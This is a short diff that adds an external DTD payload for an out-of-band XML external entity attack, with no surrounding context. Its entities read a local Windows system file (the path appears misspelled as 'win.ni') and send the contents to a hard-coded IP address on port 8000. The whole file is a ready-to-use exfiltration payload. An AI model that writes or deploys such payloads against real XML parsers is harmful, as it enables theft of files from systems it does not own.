@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "c:\\windows\win.ni">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://139.180.153.63:8000/?x=%file;'>">
+%eval;
+%exfiltrate;
